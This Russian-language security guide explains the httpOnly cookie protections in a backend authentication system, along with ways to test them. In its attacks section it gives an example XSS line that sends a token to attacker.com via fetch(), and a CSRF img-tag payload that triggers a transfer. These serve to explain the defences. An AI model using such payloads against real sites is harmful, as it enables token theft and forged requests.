# üîí –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å httpOnly Cookies

## ‚úÖ –†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –º–µ—Ä—ã –∑–∞—â–∏—Ç—ã

### 1. **HttpOnly Flag** 
```typescript
httpOnly: true
```
**–ó–∞—â–∏—Ç–∞ –æ—Ç:** XSS (Cross-Site Scripting)

**–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- Cookie –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –∏–∑ JavaScript (`document.cookie`)
- –î–∞–∂–µ –µ—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–Ω–µ–¥—Ä–∏—Ç JS –∫–æ–¥, —Ç–æ–∫–µ–Ω –Ω–µ —Å–º–æ–∂–µ—Ç –±—ã—Ç—å —É–∫—Ä–∞–¥–µ–Ω
- –¢–æ–ª—å–∫–æ HTTP –∑–∞–ø—Ä–æ—Å—ã –º–æ–≥—É—Ç —á–∏—Ç–∞—Ç—å/–æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å cookie

**–£—Ä–æ–≤–µ–Ω—å –∑–∞—â–∏—Ç—ã:** üü¢ –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –≤–∞–∂–Ω–æ

---

### 2. **Secure Flag**
```typescript
secure: process.env.NODE_ENV === 'production'
```
**–ó–∞—â–∏—Ç–∞ –æ—Ç:** Man-in-the-Middle (MITM) –∞—Ç–∞–∫–∏

**–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- Cookie –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –¢–û–õ–¨–ö–û —á–µ—Ä–µ–∑ HTTPS
- –í dev —Ä–µ–∂–∏–º–µ (HTTP) `secure: false` –¥–ª—è —É–¥–æ–±—Å—Ç–≤–∞ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏
- –í production –û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û `secure: true`

**–£—Ä–æ–≤–µ–Ω—å –∑–∞—â–∏—Ç—ã:** üü¢ –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –≤–∞–∂–Ω–æ (–≤ production)

---

### 3. **SameSite=Strict**
```typescript
sameSite: 'strict'
```
**–ó–∞—â–∏—Ç–∞ –æ—Ç:** CSRF (Cross-Site Request Forgery)

**–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- Cookie –ù–ï –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –ø—Ä–∏ cross-site –∑–∞–ø—Ä–æ—Å–∞—Ö
- –¢–æ–ª—å–∫–æ requests —Å —Ç–æ–≥–æ –∂–µ origin –º–æ–≥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å cookie
- –ë–æ–ª–µ–µ —Å—Ç—Ä–æ–≥–∏–π —Ä–µ–∂–∏–º —á–µ–º `lax` –∏–ª–∏ `none`

**–°—Ü–µ–Ω–∞—Ä–∏–∏ –∑–∞—â–∏—Ç—ã:**
```
‚ùå –ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–û:
- –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞ evil.com –∫–ª–∏–∫–∞–µ—Ç —Å—Å—ã–ª–∫—É –Ω–∞ your-app.com/api/transfer
- Cookie –ù–ï –æ—Ç–ø—Ä–∞–≤–∏—Ç—Å—è ‚Üí –∞—Ç–∞–∫–∞ –ø—Ä–æ–≤–∞–ª–∏–ª–∞—Å—å

‚úÖ –†–ê–ó–†–ï–®–ï–ù–û:
- –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞ your-app.com –∫–ª–∏–∫–∞–µ—Ç –∫–Ω–æ–ø–∫—É –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏
- Cookie –æ—Ç–ø—Ä–∞–≤–∏—Ç—Å—è ‚Üí –ª–µ–≥–∏—Ç–∏–º–Ω—ã–π –∑–∞–ø—Ä–æ—Å
```

**–£—Ä–æ–≤–µ–Ω—å –∑–∞—â–∏—Ç—ã:** üü¢ –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –≤–∞–∂–Ω–æ

---

### 4. **Signed Cookies (Cookie Signing)**
```typescript
signed: true
secret: process.env.COOKIE_SECRET
```
**–ó–∞—â–∏—Ç–∞ –æ—Ç:** Cookie Tampering (–ø–æ–¥–¥–µ–ª–∫–∞ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ)

**–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- Cookie –ø–æ–¥–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞
- –ü–æ–¥–ø–∏—Å—å –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è –ø—Ä–∏ –∫–∞–∂–¥–æ–º –∑–∞–ø—Ä–æ—Å–µ
- –ï—Å–ª–∏ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –∏–∑–º–µ–Ω–µ–Ω–æ ‚Üí –ø–æ–¥–ø–∏—Å—å –Ω–µ —Å–æ–≤–ø–∞–¥–∞–µ—Ç ‚Üí –∑–∞–ø—Ä–æ—Å –æ—Ç–∫–ª–æ–Ω—è–µ—Ç—Å—è

**–ü—Ä–∏–º–µ—Ä:**
```
–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π cookie: access_token=eyJhbGc...
–ü–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–π cookie: access_token=s:eyJhbGc....SIGNATURE

–ï—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –∏–∑–º–µ–Ω–∏—Ç —Ç–æ–∫–µ–Ω:
access_token=s:HACKED_TOKEN....SIGNATURE
                ‚Üë —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –∏–∑–º–µ–Ω–µ–Ω–æ
                
Backend –ø—Ä–æ–≤–µ—Ä–∏—Ç –ø–æ–¥–ø–∏—Å—å:
SIGNATURE != hash(HACKED_TOKEN + SECRET)
‚Üí 401 Unauthorized
```

**–£—Ä–æ–≤–µ–Ω—å –∑–∞—â–∏—Ç—ã:** üü° –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∑–∞—â–∏—Ç–∞ (defense in depth)

---

### 5. **__Host- Prefix**
```typescript
ACCESS_TOKEN_NAME: '__Host-access_token'
REFRESH_TOKEN_NAME: '__Host-refresh_token'
```
**–ó–∞—â–∏—Ç–∞ –æ—Ç:** Subdomain/Domain spoofing attacks

**–¢—Ä–µ–±–æ–≤–∞–Ω–∏—è __Host- prefix:**
- ‚úÖ `secure: true` (–û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û)
- ‚úÖ `path: '/'` (–û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û)
- ‚úÖ `domain` –ù–ï —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω (cookie –ø—Ä–∏–≤—è–∑–∞–Ω –∫ —Ç–æ—á–Ω–æ–º—É —Ö–æ—Å—Ç—É)

**–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
```
–ë–ï–ó __Host-:
- Cookie –º–æ–∂–µ—Ç –±—ã—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω —Å subdomain: .example.com
- –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –Ω–∞ evil.example.com –º–æ–∂–µ—Ç —á–∏—Ç–∞—Ç—å/–∏–∑–º–µ–Ω—è—Ç—å cookie

–° __Host-:
- Cookie —Å—Ç—Ä–æ–≥–æ –ø—Ä–∏–≤—è–∑–∞–Ω –∫ api.example.com
- evil.example.com –ù–ï –º–æ–∂–µ—Ç –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø
```

**–£—Ä–æ–≤–µ–Ω—å –∑–∞—â–∏—Ç—ã:** üü° –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∑–∞—â–∏—Ç–∞ (best practice)

---

### 6. **Short-Lived Access Tokens**
```typescript
ACCESS_TOKEN_MAX_AGE: 15 * 60 * 1000  // 15 –º–∏–Ω—É—Ç
```
**–ó–∞—â–∏—Ç–∞ –æ—Ç:** Token theft (–∫—Ä–∞–∂–∞ —Ç–æ–∫–µ–Ω–∞)

**–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –î–∞–∂–µ –µ—Å–ª–∏ access token —É–∫—Ä–∞–¥–µ–Ω, –æ–Ω –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω —Ç–æ–ª—å–∫–æ 15 –º–∏–Ω—É—Ç
- Refresh token (7 –¥–Ω–µ–π) –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–æ–≤—ã—Ö access —Ç–æ–∫–µ–Ω–æ–≤
- Refresh token —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ Redis –∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ—Ç–æ–∑–≤–∞–Ω

**–£—Ä–æ–≤–µ–Ω—å –∑–∞—â–∏—Ç—ã:** üü¢ –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –≤–∞–∂–Ω–æ

---

### 7. **Refresh Token Rotation**
```typescript
// –í auth.service.ts
await this.redis.revokeRefreshTokenWithTracking(...)
```
**–ó–∞—â–∏—Ç–∞ –æ—Ç:** Token Reuse Attack

**–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –ü—Ä–∏ –∫–∞–∂–¥–æ–º refresh —Å—Ç–∞—Ä—ã–π refresh token **–æ—Ç–∑—ã–≤–∞–µ—Ç—Å—è**
- –í—ã–¥–∞–µ—Ç—Å—è –Ω–æ–≤—ã–π refresh token
- –ï—Å–ª–∏ —Å—Ç–∞—Ä—ã–π —Ç–æ–∫–µ–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ø–æ–≤—Ç–æ—Ä–Ω–æ ‚Üí **–≤—Å–µ —Ç–æ–∫–µ–Ω—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ—Ç–∑—ã–≤–∞—é—Ç—Å—è**

**–°—Ü–µ–Ω–∞—Ä–∏–π –∞—Ç–∞–∫–∏:**
```
1. –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ —É–∫—Ä–∞–ª refresh token
2. –ñ–µ—Ä—Ç–≤–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç refresh ‚Üí –ø–æ–ª—É—á–∞–µ—Ç –Ω–æ–≤—ã–π —Ç–æ–∫–µ–Ω (—Å—Ç–∞—Ä—ã–π –æ—Ç–æ–∑–≤–∞–Ω)
3. –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø—ã—Ç–∞–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å—Ç–∞—Ä—ã–π —Ç–æ–∫–µ–Ω
4. Backend –¥–µ—Ç–µ–∫—Ç–∏—Ä—É–µ—Ç reuse attack
5. –í–°–ï —Ç–æ–∫–µ–Ω—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ—Ç–∑—ã–≤–∞—é—Ç—Å—è ‚Üí –∂–µ—Ä—Ç–≤–∞ –∑–∞–ª–æ–≥–∏–Ω–∏—Ç—Å—è –∑–∞–Ω–æ–≤–æ
```

**–£—Ä–æ–≤–µ–Ω—å –∑–∞—â–∏—Ç—ã:** üü¢ –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –≤–∞–∂–Ω–æ

---

### 8. **CORS —Å credentials**
```typescript
credentials: true
origin: [whitelist of domains]
```
**–ó–∞—â–∏—Ç–∞ –æ—Ç:** Unauthorized cross-origin requests

**–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –¢–æ–ª—å–∫–æ whitelisted origins –º–æ–≥—É—Ç –¥–µ–ª–∞—Ç—å –∑–∞–ø—Ä–æ—Å—ã —Å cookies
- –ë—Ä–∞—É–∑–µ—Ä –ø—Ä–æ–≤–µ—Ä—è–µ—Ç CORS headers
- –ù–µ—Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã–µ origins –Ω–µ –ø–æ–ª—É—á–∞—Ç Set-Cookie headers

**–£—Ä–æ–≤–µ–Ω—å –∑–∞—â–∏—Ç—ã:** üü¢ –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –≤–∞–∂–Ω–æ

---

### 9. **Rate Limiting**
```typescript
@Throttle({ default: { limit: 5, ttl: 60000 } }) // login
@Throttle({ default: { limit: 20, ttl: 60000 } }) // refresh
```
**–ó–∞—â–∏—Ç–∞ –æ—Ç:** Brute-force, DDoS

**–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –∑–∞–ø—Ä–æ—Å–æ–≤ —Å –æ–¥–Ω–æ–≥–æ IP
- Login: 5 –ø–æ–ø—ã—Ç–æ–∫ –≤ –º–∏–Ω—É—Ç—É
- Refresh: 20 –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π –≤ –º–∏–Ω—É—Ç—É

**–£—Ä–æ–≤–µ–Ω—å –∑–∞—â–∏—Ç—ã:** üü¢ –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –≤–∞–∂–Ω–æ

---

### 10. **Redis-Based Session Management**
```typescript
await this.redis.saveRefreshToken(...)
await this.redis.isRefreshTokenValid(...)
```
**–ó–∞—â–∏—Ç–∞ –æ—Ç:** Token theft + server-side revocation

**–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- Refresh —Ç–æ–∫–µ–Ω—ã —Ö—Ä–∞–Ω—è—Ç—Å—è –≤ Redis (single source of truth)
- JWT –≤–∞–ª–∏–¥–∞—Ü–∏—è + –ø—Ä–æ–≤–µ—Ä–∫–∞ –≤ Redis
- –ú–≥–Ω–æ–≤–µ–Ω–Ω—ã–π logout —á–µ—Ä–µ–∑ `revokeAllUserTokens()`

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
```
JWT —Ç–æ–ª—å–∫–æ:
‚ùå –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –æ—Ç–æ–∑–≤–∞—Ç—å –¥–æ –∏—Å—Ç–µ—á–µ–Ω–∏—è —Å—Ä–æ–∫–∞
‚ùå –£–∫—Ä–∞–¥–µ–Ω–Ω—ã–π —Ç–æ–∫–µ–Ω –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω –¥–æ expire

JWT + Redis:
‚úÖ –û—Ç–∑—ã–≤ –≤ –ª—é–±–æ–π –º–æ–º–µ–Ω—Ç
‚úÖ Logout –Ω–∞ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö
‚úÖ –î–µ—Ç–µ–∫—Ü–∏—è token reuse
```

**–£—Ä–æ–≤–µ–Ω—å –∑–∞—â–∏—Ç—ã:** üü¢ –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –≤–∞–∂–Ω–æ

---

## üõ°Ô∏è –ú–Ω–æ–≥–æ—Å–ª–æ–π–Ω–∞—è –∑–∞—â–∏—Ç–∞ (Defense in Depth)

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  Layer 1: HttpOnly + Secure + SameSite ‚îÇ ‚Üí XSS, CSRF, MITM
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Layer 2: Cookie Signing                ‚îÇ ‚Üí Tampering
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Layer 3: __Host- Prefix                ‚îÇ ‚Üí Domain spoofing
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Layer 4: Short-Lived Tokens            ‚îÇ ‚Üí Token theft impact
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Layer 5: Token Rotation                ‚îÇ ‚Üí Reuse detection
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Layer 6: Redis Validation              ‚îÇ ‚Üí Server-side control
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Layer 7: Rate Limiting                 ‚îÇ ‚Üí Brute-force
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Layer 8: CORS Whitelist                ‚îÇ ‚Üí Unauthorized origins
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–§–∏–ª–æ—Å–æ—Ñ–∏—è:** –î–∞–∂–µ –µ—Å–ª–∏ –æ–¥–∏–Ω —Å–ª–æ–π –ø—Ä–æ–±–∏—Ç, –¥—Ä—É–≥–∏–µ —Å–ª–æ–∏ –∑–∞—â–∏—â–∞—é—Ç —Å–∏—Å—Ç–µ–º—É.

---

## ‚ö†Ô∏è –í–∞–∂–Ω—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏

### Environment Variables

```bash
# –û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û –≤ production
NODE_ENV=production              # –í–∫–ª—é—á–∞–µ—Ç secure flag
COOKIE_SECRET=strong-random-key  # –î–ª—è –ø–æ–¥–ø–∏—Å–∏ cookies (–º–∏–Ω–∏–º—É–º 32 —Å–∏–º–≤–æ–ª–∞)
JWT_SECRET=different-secret-key  # –î–æ–ª–∂–µ–Ω –æ—Ç–ª–∏—á–∞—Ç—å—Å—è –æ—Ç COOKIE_SECRET
JWT_REFRESH_SECRET=another-key   # –î–æ–ª–∂–µ–Ω –æ—Ç–ª–∏—á–∞—Ç—å—Å—è –æ—Ç JWT_SECRET

# CORS whitelist
CORS_ORIGIN=https://app.example.com,https://admin.example.com
```

**üö® –ö–†–ò–¢–ò–ß–ù–û:**
- –í—Å–µ —Å–µ–∫—Ä–µ—Ç—ã –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å **—Ä–∞–∑–Ω—ã–º–∏**
- –°–µ–∫—Ä–µ—Ç—ã –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å **–¥–ª–∏–Ω–Ω—ã–º–∏** (–º–∏–Ω–∏–º—É–º 32 —Å–∏–º–≤–æ–ª–∞)
- –°–µ–∫—Ä–µ—Ç—ã –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å **—Å–ª—É—á–∞–π–Ω—ã–º–∏** (–Ω–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–ª–æ–≤–∞—Ä–Ω—ã–µ —Å–ª–æ–≤–∞)

### –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–µ–∫—Ä–µ—Ç–æ–≤

```bash
# –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–∏–ª—å–Ω—ã—Ö —Å–µ–∫—Ä–µ—Ç–æ–≤
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"

# –ò–ª–∏
openssl rand -hex 64
```

---

## üß™ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

### 1. –ü—Ä–æ–≤–µ—Ä–∫–∞ HttpOnly

```javascript
// –í –±—Ä–∞—É–∑–µ—Ä–µ DevTools ‚Üí Console
document.cookie  // –ù–ï –¥–æ–ª–∂–Ω–æ –ø–æ–∫–∞–∑—ã–≤–∞—Ç—å access_token/refresh_token
```

**‚úÖ –û–∂–∏–¥–∞–µ–º—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç:** –¢–æ–∫–µ–Ω—ã –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –≤ –≤—ã–≤–æ–¥–µ

---

### 2. –ü—Ä–æ–≤–µ—Ä–∫–∞ Secure (—Ç–æ–ª—å–∫–æ HTTPS)

```bash
# HTTP –∑–∞–ø—Ä–æ—Å (–¥–æ–ª–∂–µ–Ω –ù–ï —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å cookie –≤ production)
curl http://api.example.com/auth/login \
  -H "Content-Type: application/json" \
  -H "X-Use-Cookies: true" \
  -d '{"login":"test","password":"test","role":"admin"}'

# HTTPS –∑–∞–ø—Ä–æ—Å (–¥–æ–ª–∂–µ–Ω —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å cookie)
curl https://api.example.com/auth/login \
  -H "Content-Type: application/json" \
  -H "X-Use-Cookies: true" \
  -d '{"login":"test","password":"test","role":"admin"}'
```

---

### 3. –ü—Ä–æ–≤–µ—Ä–∫–∞ SameSite

```html
<!-- –ù–∞ evil.com –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–¥–µ–ª–∞—Ç—å –∑–∞–ø—Ä–æ—Å -->
<img src="https://your-api.com/api/v1/auth/profile">
<!-- Cookie –ù–ï –æ—Ç–ø—Ä–∞–≤–∏—Ç—Å—è ‚Üí 401 Unauthorized -->
```

---

### 4. –ü—Ä–æ–≤–µ—Ä–∫–∞ Cookie Signing

```bash
# –ü–æ–ø—ã—Ç–∫–∞ –∏–∑–º–µ–Ω–∏—Ç—å signed cookie –≤—Ä—É—á–Ω—É—é
# 1. –ü–æ–ª—É—á–∏—Ç—å signed cookie –ø–æ—Å–ª–µ login
# 2. –ò–∑–º–µ–Ω–∏—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞
# 3. –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∏–∑–º–µ–Ω–µ–Ω–Ω—ã–π cookie
# –û–∂–∏–¥–∞–µ—Ç—Å—è: 401 Unauthorized "Invalid cookie signature"
```

---

### 5. –ü—Ä–æ–≤–µ—Ä–∫–∞ Token Reuse Detection

```bash
# 1. Login ‚Üí –ø–æ–ª—É—á–∏—Ç—å refresh token
# 2. Refresh ‚Üí –ø–æ–ª—É—á–∏—Ç—å –Ω–æ–≤—ã–π access token
# 3. –ü–æ–ø—ã—Ç–∞—Ç—å—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –°–¢–ê–†–´–ô refresh token
# –û–∂–∏–¥–∞–µ—Ç—Å—è: 401 + "Security violation detected. All sessions terminated."
```

---

## üìä –°—Ä–∞–≤–Ω–µ–Ω–∏–µ —Å localStorage

| –ê—Å–ø–µ–∫—Ç | localStorage | httpOnly Cookies |
|--------|--------------|------------------|
| **XSS Protection** | ‚ùå –£—è–∑–≤–∏–º–æ | ‚úÖ –ó–∞—â–∏—â–µ–Ω–æ |
| **CSRF Protection** | ‚úÖ –ù–µ —É—è–∑–≤–∏–º–æ | ‚úÖ –ó–∞—â–∏—â–µ–Ω–æ (sameSite) |
| **Automatic sending** | ‚ùå –ù—É–∂–µ–Ω JS | ‚úÖ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ |
| **Expiration** | ‚ùå –í—Ä—É—á–Ω—É—é | ‚úÖ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ |
| **Domain control** | ‚ùå –°–ª–∞–±—ã–π | ‚úÖ –°—Ç—Ä–æ–≥–∏–π (__Host-) |
| **Signing** | ‚ùå –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ | ‚úÖ –í—Å—Ç—Ä–æ–µ–Ω–æ |
| **DevTools visibility** | ‚úÖ –í–∏–¥–Ω–æ | üü° –í–∏–¥–Ω–æ (–Ω–æ –Ω–µ —á–∏—Ç–∞–µ—Ç—Å—è JS) |

---

## üî• –†–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–Ω—ã–µ –∞—Ç–∞–∫–∏ –∏ –∑–∞—â–∏—Ç–∞

### XSS (Cross-Site Scripting)

**–°—Ü–µ–Ω–∞—Ä–∏–π:**
```javascript
// –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–Ω–µ–¥—Ä–∏–ª JS –∫–æ–¥
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'))
</script>
```

**–ó–∞—â–∏—Ç–∞ (httpOnly):**
```javascript
<script>
  document.cookie  // "" - —Ç–æ–∫–µ–Ω—ã –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã!
  localStorage.getItem('access_token')  // null - —Ç–æ–∫–µ–Ω–æ–≤ –Ω–µ—Ç!
</script>
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç:** ‚úÖ –ê—Ç–∞–∫–∞ –ø—Ä–æ–≤–∞–ª–∏–ª–∞—Å—å

---

### CSRF (Cross-Site Request Forgery)

**–°—Ü–µ–Ω–∞—Ä–∏–π:**
```html
<!-- –ù–∞ evil.com -->
<img src="https://your-api.com/api/transfer?to=attacker&amount=1000">
```

**–ó–∞—â–∏—Ç–∞ (sameSite=strict):**
- Cookie –ù–ï –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –ø—Ä–∏ cross-site –∑–∞–ø—Ä–æ—Å–µ
- API –ø–æ–ª—É—á–∞–µ—Ç –∑–∞–ø—Ä–æ—Å –ë–ï–ó —Ç–æ–∫–µ–Ω–∞
- –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç 401 Unauthorized

